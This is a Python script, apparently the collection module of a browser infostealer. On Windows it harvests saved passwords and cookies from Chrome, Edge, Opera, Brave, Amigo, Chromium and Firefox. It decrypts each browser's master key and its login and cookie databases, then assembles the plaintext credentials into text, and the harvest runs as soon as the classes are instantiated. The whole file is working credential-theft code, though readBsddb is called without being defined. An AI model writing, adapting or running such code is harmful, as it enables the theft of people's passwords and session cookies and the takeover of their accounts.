import re, getpass
import sys, os, json, base64, sqlite3, win32crypt
import shutil, hmac
from Crypto.Cipher import DES3, AES
from pyasn1.codec.der import decoder
from pyasn1.codec.der import decoder
from Crypto.Util.Padding import unpad
from Crypto.Util.number import long_to_bytes
from hashlib import sha1, pbkdf2_hmac
from binascii import hexlify, unhexlify
from pathlib import Path


__version__ = '1.2'


class Chromium:
    def __init__(self):
        self.brave_pass, self.brave_cookies = self.get_browser_data('brave')
        self.chrome_pass, self.chrome_cookies = self.get_browser_data('chrome')
        self.opera_pass, self.opera_cookies = self.get_browser_data('opera')
        self.edge_pass, self.edge_cookies = self.get_browser_data('edge')
        self.amigo_pass, self.amigo_cookies = self.get_browser_data('amigo')
        self.chromium_pass, self.chromium_cookies = self.get_browser_data('chromium')


    def get_master_key(self, path):
        with open(str(path), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def get_cookies(self, path, key):
        data = ''
        shutil.copyfile(str(path), './Cookies')
        conn = sqlite3.connect('./Cookies')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
        for host_key, name, value, encrypted_value in cursor.fetchall():
            try:
                cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
                decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
            except:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0
            data += (f'{host_key} | {name} | {decrypted_value}\n')
        conn.commit()
        conn.close()
        os.remove('./Cookies')
        return str(data)


    def get_passwords(self, path, key):
        data = ''
        shutil.copyfile(str(path), './Login Data')
        conn = sqlite3.connect('./Login Data')
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for url, username, encrypted_password in cursor.fetchall():
            if not url:
                continue
            cipher = AES.new(key, AES.MODE_GCM, encrypted_password[3:15])
            decrypted_pass = cipher.decrypt(encrypted_password[15:])
            decrypted_pass = decrypted_pass[:-16].decode()
            data += (f'URL: {url} \nUsername: {username} \nPassword: {decrypted_pass} \n{"-" * 25}\n')
        conn.commit()
        conn.close()
        os.remove('./Login Data')
        return str(data)


    def get_browser_data(self, browser):
        match browser:
            case 'chrome':
                path = os.getenv("localAPPDATA") + str("\\Google\\Chrome\\User Data")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Default\\Login Data"):
                        chrome_pass = self.get_passwords(f"{path}\\Default\\Login Data", key)
                    else: chrome_pass = 'not found'
                    if os.path.exists(f"{path}\\Default\\Network\\Cookies"):
                        chrome_cookies = self.get_cookies(f"{path}\\Default\\Network\\Cookies", key)
                    else: chrome_cookies = 'not found'
                    return chrome_pass, chrome_cookies
                else: return 'not found', 'not found'
            case 'opera':
                path = os.getenv("localAPPDATA") + str("\\..\\Roaming\\Opera Software\\Opera Stable")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Login Data"):
                        opera_pass = self.get_passwords(f"{path}\\Login Data", key)
                    else: opera_pass = 'not found'
                    if os.path.exists(f"{path}\\Cookies"):
                        opera_cookies = self.get_cookies(f"{path}\\Cookies", key)
                    else: opera_cookies = 'not found'
                    return opera_pass, opera_cookies
                else: return 'not found', 'not found'
            case 'edge':
                path = os.getenv("localAPPDATA") + str("\\Microsoft\\Edge\\User Data")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Default\\Login Data"):
                        edge_pass = self.get_passwords(f"{path}\\Default\\Login Data", key)
                    else: edge_pass = 'not found'
                    if os.path.exists(f'{path}\\Default\\Cookies'):
                        edge_cookies = self.get_cookies(f"{path}\\Default\\Cookies", key)
                    else: edge_cookies = 'not found'
                    return edge_pass, edge_cookies
                else: return 'not found', 'not found'
            case 'amigo':
                path = os.getenv("localAPPDATA") + str("\\Amigo\\User Data")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Default\\Login Data"):
                        amigo_pass = self.get_passwords(f"{path}\\Default\\Login Data", key)
                    else: amigo_pass = 'not found'
                    if os.path.exists(f"{path}\\Default\\Cookies"):
                        amigo_cookies = self.get_cookies(f"{path}\\Default\\Cookies", key)
                    else: amigo_cookies = 'not found'
                    return amigo_pass, amigo_cookies
                else: return 'not found', 'not found'
            case 'chromium':
                path = os.getenv("localAPPDATA") + str("\\Chromium\\User Data")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Default\\Login Data"):    
                        chromium_pass = self.get_passwords(f"{path}\\Default\\Login Data", key)
                    else: chromium_pass = 'not found'
                    if os.path.exists(f"{path}\\Default\\Cookies"):
                        chromium_cookies = self.get_cookies(f"{path}\\Default\\Cookies", key)
                    else: chromium_cookies = 'not found'
                    return chromium_pass, chromium_cookies
                else: return 'not found', 'not found'
            case 'brave':
                path = os.getenv("localAPPDATA") + str("\\BraveSoftware\\Brave-Browser\\User Data")
                if os.path.exists(path):
                    key = self.get_master_key(f'{path}\\Local State')
                    if os.path.exists(f"{path}\\Default\\Login Data"):    
                        brave_pass = self.get_passwords(f"{path}\\Default\\Login Data", key)
                    else: brave_pass = 'not found'
                    if os.path.exists(f"{path}\\Default\\Cookies"):
                        brave_cookies = self.get_cookies(f"{path}\\Default\\Cookies", key)
                    else: brave_cookies = 'not found'
                    return brave_pass, brave_cookies
                else: return 'not found', 'not found'


class Firefox:
    def __init__(self):
        self.DirList = []
        self.sqlite_file = None
        self.json_file = None
        self.CKA_ID = unhexlify('f8000000000000000000000000000001')
        self.firefox_pass = self.get_passwords() or 'not found'
        self.firefox_cookies = self.get_cookies() or 'not found'


    def printASN1(self, d, l, rl):
        type = d[0]
        length = d[1]
        if length&0x80 > 0:
            nByteLength = length&0x7f
            length = d[2]
            skip=1
        else:
            skip=0
        if type==0x30:
            seqLen = length
            readLen = 0
            while seqLen>0:
                len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            return length+2
        elif type==6:
            oidVal = hexlify(d[2:2+length])
            return length+2
        elif type==4:
            return length+2
        elif type==5:
            return length+2
        elif type==2:
            return length+2
        else:
            if length==l-2:
                return length


    def decryptMoz3DES(self, globalSalt, masterPassword, entrySalt, encryptedData ):
        hp = sha1( globalSalt+masterPassword ).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1( hp+entrySalt ).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)


    def decodeLoginData(self, data):
        asn1data = decoder.decode(base64.b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext


    def getLoginData(self):
        logins = []
        if self.json_file.exists():
            loginf = open( self.json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append( (self.decodeLoginData(encUsername), self.decodeLoginData(encPassword), row['hostname']) )
            return logins
        elif self.sqlite_file.exists():
            conn = sqlite3.connect(self.sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                print(row[1], encUsername, encPassword)
                logins.append( (self.decodeLoginData(encUsername), self.decodeLoginData(encPassword), row[1]) )
            return logins


    def extractSecretKey(self, masterPassword, keyData):
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3+entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = self.decryptMoz3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
        if cleartextData != b'password-check\x02\x02':
            sys.exit()
        if self.CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[ self.CKA_ID ]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode( privKeyEntry[3+saltLen+nameLen:] )
        data = privKeyEntry[3+saltLen+nameLen:]
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = self.decryptMoz3DES( globalSalt, masterPassword, entrySalt, privKeyData )
        privKeyASN1 = decoder.decode( privKey )
        prKey= privKeyASN1[0][2].asOctets()
        prKeyASN1 = decoder.decode( prKey )
        id = prKeyASN1[0][1]
        key = long_to_bytes( prKeyASN1[0][3] )
        return key


    def decryptPBE(self, decodedItem, masterPassword, globalSalt):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = self.decryptMoz3DES( globalSalt, masterPassword, entrySalt, cipherT )
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32
            k = sha1(globalSalt+masterPassword).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)
            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
            return clearText, pbeAlgo


    def getKey(self, masterPassword, directory ):
        if (directory / 'key4.db').exists():
            conn = sqlite3.connect(directory / 'key4.db')
            c = conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]
            item2 = row[1]
            self.printASN1(item2, len(item2), 0)
            decodedItem2 = decoder.decode( item2 )
            clearText, algo = self.decryptPBE( decodedItem2, masterPassword, globalSalt )
            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 == self.CKA_ID:
                    self.printASN1( a11, len(a11), 0)
                    decoded_a11 = decoder.decode( a11 )
                    clearText, algo = self.decryptPBE( decoded_a11, masterPassword, globalSalt )
                    return clearText[:24], algo
                else:
                    print('no saved login/password')
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = self.readBsddb(directory / 'key3.db')
            key = self.extractSecretKey(masterPassword, keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        else:
            return None, None


    def FindFiles(self):
        for root, dirs, files in os.walk(Path(r'C:/Users/{}/AppData/Roaming/Mozilla/Firefox/Profiles/'.format(getpass.getuser()))):
            for dir in dirs:
                self.DirList.append(dir)


    def get_passwords(self):
        data = ""
        self.FindFiles()
        for dir in self.DirList:
            try:
                key, algo = self.getKey(''.encode(), Path(os.path.join('C:/Users/{}/AppData/Roaming/Mozilla/Firefox/Profiles/'.format(getpass.getuser()), dir)))
                self.sqlite_file = Path(os.path.join(os.environ["USERPROFILE"],
                            "AppData", "Roaming", "Mozilla", "Firefox",
                            "Profiles", dir))/ 'signons.sqlite'
                self.json_file = Path(os.path.join(os.environ["USERPROFILE"],
                            "AppData", "Roaming", "Mozilla", "Firefox",
                            "Profiles", dir))/ 'logins.json'
                logins = self.getLoginData()
                if len(logins) == 0:
                    print ('no stored passwords')
                if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                    for i in logins:
                        assert i[0][0] == self.CKA_ID
                        url = (i[2])
                        iv = i[0][1]
                        ciphertext = i[0][2]
                        username = unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 )
                        iv = i[1][1]
                        ciphertext = i[1][2]
                        password = unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 )
                        log = ""
                        log += (f"Url: {url} \n")
                        log += (f"Username: {username.decode('utf8')} \n")
                        log += (f"Password: {password.decode('utf8')} \n")
                        data += log + "\n"
                    return data
            except:
                return 'not found'


    def get_cookies(self):
        cookies = ''
        path = os.getenv("localAPPDATA") + str("\\..\\Roaming\\Mozilla\\Firefox")
        if os.path.exists(path):
            with open (f'{path}\\profiles.ini', 'r') as file:
                text = file.read()
                text = re.search(r'/\S*.default-release', text)
                default = text.group()[1:]
            shutil.copyfile(f'{path}\\Profiles\\{default}\\Cookies.sqlite', './Cookies')
            conn = sqlite3.connect('./Cookies')
            cursor = conn.cursor()
            cursor.execute('SELECT name, value, host from moz_cookies')
            for name, value, host in cursor.fetchall():
                cookies += (f'{host} | {name} | {value} \n')
            conn.commit()
            conn.close()
            os.remove('./Cookies')
            return(cookies)
        return 'not found'
